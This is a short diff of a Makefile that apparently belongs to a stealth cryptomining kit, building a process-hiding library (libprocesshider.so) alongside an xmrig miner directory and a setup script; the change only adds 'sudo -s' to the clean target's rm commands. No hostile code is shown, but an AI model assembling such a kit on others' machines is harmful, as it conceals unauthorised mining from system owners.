@@ -5,5 +5,5 @@ libprocesshider.so: processhider.c
 
 .PHONY clean:
 	rm -f libprocesshider.so
-	rm -f setup.sh
-	rm -f -r xmrig
+	sudo -s rm -f setup.sh
+	sudo -s rm -f -r xmrig
